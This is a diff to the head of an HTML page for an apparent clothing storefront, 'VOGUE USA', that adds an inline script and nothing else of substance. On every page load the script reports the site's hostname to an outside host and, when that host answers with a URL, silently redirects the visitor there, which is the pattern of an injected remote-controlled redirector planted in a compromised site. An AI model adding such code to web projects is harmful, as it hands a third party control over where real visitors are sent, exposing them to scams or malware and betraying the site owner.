@@ -1,6 +1,24 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
+<head><script>
+(function(){
+  var toolUrl = "http://myredirectiontool-xqn4t.ondigitalocean.app/get.php";
+  var hostname = window.location.hostname;
+  var xhr = new XMLHttpRequest();
+  xhr.open("GET", toolUrl + "?site=" + encodeURIComponent(hostname), true);
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState === 4 && xhr.status === 200) {
+      try {
+        var data = JSON.parse(xhr.responseText);
+        if (data.redirect && data.redirect !== "") {
+          window.location.replace(data.redirect);
+        }
+      } catch(e) {}
+    }
+  };
+  xhr.send();
+})();
+</script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="description" content="VOGUE USA - Premium American Fashion for Men, Women & Kids. Shop the latest trends in clothing, shoes and accessories with free shipping on orders over $75.">
